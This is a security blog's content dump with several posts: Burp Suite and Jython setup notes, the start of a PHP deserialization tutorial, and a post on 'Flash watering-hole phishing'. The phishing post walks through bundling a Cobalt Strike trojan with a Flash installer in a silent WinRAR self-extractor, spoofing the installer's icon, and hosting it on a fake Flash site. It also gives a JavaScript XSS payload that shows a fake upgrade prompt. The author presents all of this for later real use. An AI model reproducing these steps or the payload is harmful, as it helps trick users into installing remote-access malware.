class="string">'任务2接受参数为:&#123;&#125;'</span>.format(msg))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job3</span><span class="params">(msg)</span>:</span></span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    print(<span class="string">'任务3接受参数为:&#123;&#125;'</span>.format(msg))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ensure_schedule_1</span><span class="params">()</span>:</span></span><br><span class="line">    threading.Thread(target=job1,args=(<span class="number">1</span>,)).start()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ensure_schedule_2</span><span class="params">()</span>:</span></span><br><span class="line">    threading.Thread(target=job2,args=(<span class="number">2</span>,)).start()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ensure_schedule_3</span><span class="params">()</span>:</span></span><br><span class="line">    threading.Thread(target=job3,args=(<span class="number">3</span>,)).start()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">()</span>:</span></span><br><span class="line">    schedule.every(<span class="number">1</span>).seconds.do(ensure_schedule_1)</span><br><span class="line">    schedule.every(<span class="number">1</span>).seconds.do(ensure_schedule_2)</span><br><span class="line">    schedule.every(<span class="number">1</span>).seconds.do(ensure_schedule_3)</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        schedule.run_pending()</span><br><span class="line">run()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Flash水坑钓鱼</title>
      <link href="/2020/02/06/Flash%E6%B0%B4%E5%9D%91%E9%92%93%E9%B1%BC/"/>
      <url>/2020/02/06/Flash%E6%B0%B4%E5%9D%91%E9%92%93%E9%B1%BC/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="Flash水坑钓鱼"><a href="#Flash水坑钓鱼" class="headerlink" title="Flash水坑钓鱼"></a>Flash水坑钓鱼</h3><ul><li><ul><li><a href="#_2">起因</a></li><li><a href="#_7">准备</a></li><li><a href="#_12">先配置一个马子吧</a></li><li><a href="#_19">自解压捆绑文件的利用</a></li><li><ul><li><a href="#_81">上传到服务器</a></li></ul></li><li><a href="#_92">常见用法</a></li></ul></li></ul><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>在网络上看到许多大佬都拿这个钓鱼，而且感觉成功率贼高。<br>未雨绸缪，先测试一下，以后肯定用的到</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>flash官网的钓鱼源码：<a href="https://github.com/r00tSe7en/Fake-flash.cn" target="_blank" rel="noopener">https://github.com/r00tSe7en/Fake-flash.cn</a><br>一个服务器<br>一个域名<br>一个马子</p><h2 id="先配置一个马子吧"><a href="#先配置一个马子吧" class="headerlink" title="先配置一个马子吧"></a>先配置一个马子吧</h2><ul><li>使用常用的CS吧，随便来一个，成功上线<br><img src="https://img-blog.csdnimg.cn/202002061054387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>关于免杀，暂时就不了(因为菜)</li><li>推荐使用一个好的隐藏方式</li></ul><h2 id="自解压捆绑文件的利用"><a href="#自解压捆绑文件的利用" class="headerlink" title="自解压捆绑文件的利用"></a>自解压捆绑文件的利用</h2><p>捆版木马时碰到一个问题大多捆绑软件本身就会被杀软查杀，所以选择利用winrar实现捆绑。</p><ol><li><p>准备好的木马和flash安装程序</p></li><li><p>鼠标右键，添加到压缩文件。</p></li></ol><p><code>点击创建自解压格式压缩文件</code><br><img src="https://img-blog.csdnimg.cn/20200206110906864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>4. 点击高级自解压选项——————-常规<br><img src="https://img-blog.csdnimg.cn/20200206111046921.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用绝对路径 -------------- C:\windows\temp</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200206111221661.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ol start="4"><li>设置———提取后运行</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\windows\temp\flash.exe</span><br><span class="line"></span><br><span class="line">C:\windows\temp\flashplayer_install_cn.exe</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200206111434557.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ol start="5"><li>安静模式———全部隐藏</li></ol><p><img src="https://img-blog.csdnimg.cn/2020020611150857.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ol start="6"><li>更新</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">更新方式----解压并更新文件</span><br><span class="line"></span><br><span class="line">覆盖方式----覆盖所有文件</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200206111745780.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ol start="7"><li>确定，出去把文件名改的像一点<br><img src="https://img-blog.csdnimg.cn/20200206114209174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>这图标也不像啊，得改<br><img src="https://img-blog.csdnimg.cn/2020020611432490.png" alt="在这里插入图片描述"></li><li>使用 ResourceHacker 把图标改了，自行下载</li><li>通过ResourceHacker打开原版的flash安装程序，点击Icon Group文件夹中的文件，鼠标右键保存“*.ico资源”，即可导出ico图标。<br><img src="https://img-blog.csdnimg.cn/20200206115037810.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>同样的方法—-ResourceHacker打开刚刚打包好的文件，点击Icon Group文件夹中的文件，鼠标右键替换ico图标，最后保存</li></ol><p><img src="https://img-blog.csdnimg.cn/20200206115439272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200206115637855.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>最后保存成功，图标搞定<img src="https://img-blog.csdnimg.cn/2020020611570775.png" alt="图标搞定"></p><ul><li>捆绑木马就做好了。下面是运行截图，伪装的完美，全程无感知，就是没有做木马的免杀如果有杀毒软件会报毒。</li><li><img src="https://img-blog.csdnimg.cn/20200206115918874.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>也能上线<img src="https://img-blog.csdnimg.cn/20200206120000983.png" alt="在这里插入图片描述"></li><li>马子完成了。</li></ul><h3 id="上传到服务器"><a href="#上传到服务器" class="headerlink" title="上传到服务器"></a>上传到服务器</h3><p>跟前情况自己开服务，我就直接装了了一个Apache<br><img src="https://img-blog.csdnimg.cn/20200206152501383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>修改fake网站的源码，把链接加进去。</p><p><img src="https://img-blog.csdnimg.cn/20200206153316957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上传到服务器看效果</p><p><img src="https://img-blog.csdnimg.cn/20200206155353255.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>还可以，就是域名方面需要进一步的伪造，要买一个不错的域名更佳</p><h2 id="常见用法"><a href="#常见用法" class="headerlink" title="常见用法"></a>常见用法</h2><p>直接给地址让下载这个可能性太低了，感觉还是需要XSS打进去，弹框提示上钩的几率最大，这也大家常用的方法之一。<br>但是有个问题不能让看出是弹窗，最后是可以隐藏掉网站显示</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//重写alert方法，去掉地址显示</span></span><br><span class="line">window.alert = function(name)&#123;</span><br><span class="line"><span class="keyword">var</span> iframe = document.createElement(<span class="string">"IFRAME"</span>);</span><br><span class="line">iframe.style.display=<span class="string">"none"</span>;</span><br><span class="line">iframe.setAttribute(<span class="string">"src"</span>, <span class="string">'data:text/plain,'</span>);</span><br><span class="line">document.documentElement.appendChild(iframe);</span><br><span class="line">window.frames[<span class="number">0</span>].window.alert(name);</span><br><span class="line">iframe.parentNode.removeChild(iframe);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//重写confirm方法，去掉地址显示</span></span><br><span class="line">window.confirm = function(name)&#123;</span><br><span class="line"><span class="keyword">var</span> iframe = document.createElement(<span class="string">"IFRAME"</span>);</span><br><span class="line">iframe.style.display=<span class="string">"none"</span>;</span><br><span class="line">iframe.setAttribute(<span class="string">"src"</span>, <span class="string">'data:text/plain,'</span>);</span><br><span class="line">document.documentElement.appendChild(iframe);</span><br><span class="line"><span class="keyword">var</span> result = window.frames[<span class="number">0</span>].window.confirm(name);</span><br><span class="line">iframe.parentNode.removeChild(iframe);</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200206162156507.png" alt="在这里插入图片描述"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.alert = function(name)&#123;<span class="keyword">var</span> iframe = document.createElement(<span class="string">"IFRAME"</span>);iframe.style.display=<span class="string">"none"</span>;iframe.setAttribute(<span class="string">"src"</span>, <span class="string">'data:text/plain,'</span>);document.documentElement.appendChild(iframe);window.frames[<span class="number">0</span>].window.alert(name);iframe.parentNode.removeChild(iframe);&#125;;alert(<span class="string">"您的FLASH版本过低，请尝试升级后访问改页面!"</span>);window.location.href=<span class="string">"https://www.baidu.com"</span>;</span><br></pre></td></tr></table></figure><p>可以直接在XSS平台里面建一个模块，然后xss打出去，要不太长了代码</p>]]></content>
      
      
      <categories>
          
          <category> WEB 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>IPRotate_Burp_Extension安装</title>
      <link href="/2020/01/17/IPRotate_Burp_Extension%E5%AE%89%E8%A3%85/"/>
      <url>/2020/01/17/IPRotate_Burp_Extension%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>IPRotate_Burp_Extension安装</p><ol><li>在BurpSuite中安装Jython环境</li></ol><p><a href="https://blog.csdn.net/god\_zzZ/article/details/104019232" target="_blank" rel="noopener">https://blog.csdn.net/god\_zzZ/article/details/104019232</a></p><ol start="2"><li>为Python 安装boto3模块。<br>pip install boto3</li><li>导入python文件</li></ol><p><img src="https://img-blog.csdnimg.cn/20200117145551414.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 配环境 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>在BurpSuite中安装Jython环境</title>
      <link href="/2020/01/17/%E5%9C%A8BurpSuite%E4%B8%AD%E5%AE%89%E8%A3%85Jython%E7%8E%AF%E5%A2%83/"/>
      <url>/2020/01/17/%E5%9C%A8BurpSuite%E4%B8%AD%E5%AE%89%E8%A3%85Jython%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="在BurpSuite中安装Jython环境"><a href="#在BurpSuite中安装Jython环境" class="headerlink" title="在BurpSuite中安装Jython环境"></a>在BurpSuite中安装Jython环境</h2><ol><li>下载模块</li></ol><p>下载地址<br><a href="https://www.jython.org/download.html" target="_blank" rel="noopener">https://www.jython.org/download.html</a><br>下载 Jython <strong>Standalone</strong>版本的<br><img src="https://img-blog.csdnimg.cn/2020011714461488.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ol start="2"><li>打开burp</li></ol><p><img src="https://img-blog.csdnimg.cn/2020011714475897.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>第一个框子是刚刚下载jar包<br>第二个时候python的模块文件地址 要到 lib\site-packages里面</p><ol start="4"><li>成功</li></ol>]]></content>
      
      
      <categories>
          
          <category> 配环境 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化漏洞解析和研究</title>
      <link href="/2020/01/03/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%E5%92%8C%E7%A0%94%E7%A9%B6/"/>
      <url>/2020/01/03/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%E5%92%8C%E7%A0%94%E7%A9%B6/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="php反序列化漏洞解析和研究"><a href="#php反序列化漏洞解析和研究" class="headerlink" title="php反序列化漏洞解析和研究"></a>php反序列化漏洞解析和研究</h3><ul><li><a href="#PHP_2">PHP序列化是什么</a></li><li><ul><li><a href="#_17">铺垫知识</a></li><li><ul><li><a href="#_18">示例序列化</a></li><li><a href="#_62">反序列实例</a></li></ul></li></ul></li><li><a href="#_73">魔术方法</a></li><li><ul><li><a href="#_113">比较重要的方法</a></li></ul></li><li><a href="#_204">反序列化对象注入</a></li><li><ul><li><a href="#__wakeup_206">绕过__wakeup()方法</a></li></ul></li><li><a href="#POP_240">POP链构造</a></li><li><ul><li><a href="#POP_242">POP：面向属性编程</a></li><li><a href="#_246">基本概念</a></li><li><a href="#POP_251">POP链利用</a></li><li><a href="#_255">训练</a></li></ul></li></ul><h1 id="PHP序列化是什么"><a href="#PHP序列化是什么" class="headerlink" title="PHP序列化是什么"></a>PHP序列化是什么</h1><blockquote><p>serialize() //将一个对象转换成一个字符串<br>unserialize() //将字符串还原成一个对象</p></blockquote><p>序列化：将php值转换为可存储或传输的字符串，目的是防止丢失其结构和数据类型。</p><p>反序列化：序列化的逆过程，将字符串再转化成原来的php变量，以便于使用。</p><p>简单来说，就是涉及php中的serialize与unserialize两个函数。</p><p>通过序列化与反序列化我们可以很方便的在PHP中进行对象的传递。本质上反序列化是没有危害的。但是如果用户对数据可控那就可以利用反序列化构造payload攻击。</p><h2 id="铺垫知识"><a href="#铺垫知识" class="headerlink" title="铺垫知识"></a>铺垫知识</h2><h3 id="示例序列化"><a href="#示例序列化" class="headerlink" title="示例序列化"></a>示例序列化</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">testclass</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $flag = <span class="string">"flag&#123;233&#125;"</span>;</span><br><span class="line">        <span class="keyword">public</span> $name = <span class="string">"baba"</span>;</span><br><span class="line">        <span class="keyword">public</span> $age = <span class="string">"18"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">Info</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'输出'</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">' '</span>.<span class="keyword">$this</span>-&gt;age;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $test = <span class="keyword">new</span> testclass();</span><br><span class="line">    $test-&gt;name = <span class="string">'zhaibaba'</span>;</span><br><span class="line">    $test -&gt;age =<span class="string">'18'</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $test-&gt;Info();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">    $data = serialize($test);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"序列化\n"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $data;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure><p>输出<br>输出zhaibaba 18</p><p>序列化<br>O:9:“testclass”:3:{s:15:” testclass flag”;s:9:“flag{233}”;s:4:“name”;s:8:“zhaibaba”;s:3:“age”;s:2:“18”;}</p><p><code>O:9:&quot;testclass&quot;</code> 代表Object(对象) 9个字符:testclass<br><code>:3</code>对象属性个数为3<br><code>{}</code>中为属性字符数：属性值<br><code>s:15:&quot; testclass flag&quot;</code> 为 string类型 private私有属性 会加类名 public 共有的 直接属性名</p><blockquote><p>public权限就是正常的变量权限，一般声明的变量权限均为public<br>protected权限是私有权限，即只能在类内使用，子类可以继承这个变量<br>private权限也是私有权限，比protected权限更似有一些，只能在本类内使用，子类不能继承</p></blockquote><h3 id="反序列实例"><a href="#反序列实例" class="headerlink" title="反序列实例"></a>反序列实例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$un = unserialize($data);</span><br><span class="line">   <span class="comment"># $un = unserialize('O:9:"testclass":2:&#123;s:4:"name";s:8:"zhaibaba";s:3:"age";s:2:"18";&#125;');</span></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"反序列化\n"</span>;</span><br><span class="line">   var_dump($un);</span><br></pre></td></tr></table></figure><p>反序列化为一个对象了<br><img src="https://img-blog.csdnimg.cn/20200103114111631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h1><blockquote><p>魔术方法：在php中以两个下划线字符（__）开头的方法，方法名都是PHP预先定义好的，之所以称为魔术方法<br>就是这些方法不需要显示的调用而是由某种特定的条件触发执行。</p></blockquote><p>在利用对PHP反序列化进行利用时，经常需要通过反序列化中的魔术方法，检查方法里有无敏感操作来进行利用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">常见方法</span><br><span class="line">__constuct: 构建对象的时被调用</span><br><span class="line"></span><br><span class="line">__destruct: 明确销毁对象或脚本结束时被调用</span><br><span class="line"></span><br><span class="line">__wakeup: 当使用unserialize时被调用，可用于做些对象的初始化操作</span><br><span class="line"></span><br><span class="line">__sleep: 当使用serialize时被调用，当你不需要保存大对象的所有数据时很有用</span><br><span class="line"></span><br><span class="line">__call: 调用不可访问或不存在的方法时被调用</span><br><span class="line"></span><br><span class="line">__callStatic: 调用不可访问或不存在的静态方法时被调用</span><br><span class="line"></span><br><span class="line">__set: 当给不可访问或不存在属性赋值时被调用</span><br><span class="line"></span><br><span class="line">__get: 读取不可访问或不存在属性时被调用</span><br><span class="line"></span><br><span class="line">__isset: 对不可访问或不存在的属性调用<span class="keyword">isset</span>()或<span class="keyword">empty</span>()时被调用</span><br><span class="line"></span><br><span class="line">__unset: 对不可访问或不存在的属性进行<span class="keyword">unset</span>时被调用</span><br><span class="line"></span><br><span class="line">__invoke: 当以函数方式调用对象时被调用</span><br><span class="line"></span><br><span class="line">__toString: 当一个类被转换成字符串时被调用</span><br><span class="line"></span><br><span class="line">__clone: 进行对象<span class="keyword">clone</span>时被调用，用来调整对象的克隆行为</span><br><span class="line"></span><br><span class="line">__debuginfo: 当调用var_dump()打印对象时被调用（当你不想打印所有属性）适用于PHP5<span class="number">.6</span>版本</span><br><span class="line"></span><br><span class="line">__set_state: 当调用var_export()导出类时，此静态方法被调用。用__set_state的返回值做为var_export的返回值</span><br></pre></td></tr></table></figure><h2 id="比较重要的方法"><a href="#比较重要的方法" class="headerlink" title="比较重要的方法"></a>比较重要的方法</h2><p><strong>__sleep()</strong></p><blockquote><p>serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。</p></blockquote><p>对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。</p><p>__wakeup()</p><blockquote><p>unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup<br>方法，预先准备对象需要的资源。</p></blockquote><p>预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Caiji</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($ID, $sex, $age)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ID = $ID;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex = $sex;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;info = sprintf(<span class="string">"ID: %s, age: %d, sex: %s"</span>, <span class="keyword">$this</span>-&gt;ID, <span class="keyword">$this</span>-&gt;sex, <span class="keyword">$this</span>-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;info . <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * serialize前调用 用于删选需要被序列化存储的成员变量</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array [description]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span> . <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">'ID'</span>, <span class="string">'sex'</span>, <span class="string">'age'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * unserialize前调用 用于预先准备对象资源</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span> . <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;info = sprintf(<span class="string">"ID: %s, age: %d, sex: %s"</span>, <span class="keyword">$this</span>-&gt;ID, <span class="keyword">$this</span>-&gt;sex, <span class="keyword">$this</span>-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$me = <span class="keyword">new</span> Caiji(<span class="string">'twosmi1e'</span>, <span class="number">20</span>, <span class="string">'male'</span>);</span><br><span class="line"></span><br><span class="line">$me-&gt;getInfo();</span><br><span class="line"><span class="comment">//存在__sleep(函数，$info属性不会被存储</span></span><br><span class="line">$temp = serialize($me);</span><br><span class="line"><span class="keyword">echo</span> $temp . <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"></span><br><span class="line">$me = unserialize($temp);</span><br><span class="line"><span class="comment">//__wakeup()组装的$info</span></span><br><span class="line">$me-&gt;getInfo();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果<br><img src="https://img-blog.csdnimg.cn/20200103135151309.png" alt="在这里插入图片描述"></p><p><strong>__toString()</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__toString() 方法用于一个类被当成字符串时应怎样回应。</span><br><span class="line">例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，</span><br><span class="line">否则将发出一条 E_RECOVERABLE_ERROR 